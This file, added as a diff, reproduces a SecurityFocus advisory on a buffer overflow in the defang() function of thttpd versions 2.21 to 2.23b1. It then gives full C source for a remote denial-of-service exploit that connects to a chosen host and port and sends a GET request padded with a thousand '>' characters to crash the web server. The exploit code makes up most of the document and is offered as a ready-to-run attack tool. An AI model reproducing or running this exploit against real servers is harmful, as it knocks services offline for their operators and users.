@@ -1,0 +1,79 @@
+source: http://www.securityfocus.com/bid/8906/info
+ 
+A vulnerability has been reported in thttpd that may allow a remote attacker to execute arbitrary code on vulnerable host. The issue is reported to exist due to a lack of bounds checking by software, leading to a buffer overflow condition. The problem is reported to exist in the defang() function in libhttpd.c.
+ 
+This issue may allow an attacker to gain unauthorized access to a vulnerable host. Successful exploitation of this issue may allow an attacker to execute arbitrary code in the context of the web server in order to gain unauthorized access to a vulnerable system.
+ 
+thttpd versions 2.21 to 2.23b1 have been reported to be prone to this issue, however other versions may be affected as well. 
+
+==========================[ thttpd-sontot.c ]=========================
+ 
+// thttpd-sontot.c remote dos exploit by d3ck4
+// Base On Texonet Security Advisory 20030908
+// Application    : thttpd
+// Version(s)     : 2.21 - 2.23b1
+// Platforms      : FreeBSD, SunOS 4, Solaris 2, BSD/OS, Linux, OSF
+// Solution       : Upgrade to version 2.24
+// Remote exploit not yet ;P~
+ 
+#include <stdio.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netdb.h>
+
+int main(int argc, char **argv)
+{
+  struct sockaddr_in addr;
+  struct hostent *host;
+  char buffer[1000];
+  char buffer1[1130];
+  int s, i;
+  if(argc != 3)
+  {
+    fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);
+    exit(0);
+  }
+  s = socket(AF_INET, SOCK_STREAM, 0);
+  if(s == -1)
+  {
+    perror("socket() failed\n");
+    exit(0);
+  }
+  host = gethostbyname(argv[1]);
+  if( host == NULL)
+  {
+    herror("gethostbyname() failed");
+    exit(0);
+  }
+  addr.sin_addr = *(struct in_addr*)host->h_addr;
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(atol(argv[2]));
+ 
+  if(connect(s, &addr, sizeof(addr)) == -1)
+  {
+    perror("couldn't connect to server\n");
+    exit(0);
+  }
+ 
+  for(i = 0; i < 1000 ; i++)
+    buffer1[i] = '>';
+    sprintf(buffer, "GET /%s HTTP/1.0\r\n\r\n\r\n", buffer1);
+    printf("\n(Drink Tongkat-Ali For Better Performance ;P~ !)\n\n");
+    printf("Buffer is: %s\n\n", buffer1);
+    printf("Buffer filled... now sending buffer\n");
+    send(s, buffer, strlen(buffer), 0);
+ 
+    printf("Buffer sent.\nNow thttpd daemon should be dead !!!\n\n");
+    close(s);
+  return 0;
+}
+ 
+/* EOF */
+
+==========================[ thttpd-sontot.c ]=========================
+
+
+---------------------------------
+Do you Yahoo!?
+Free Pop-Up Blocker - Get it now
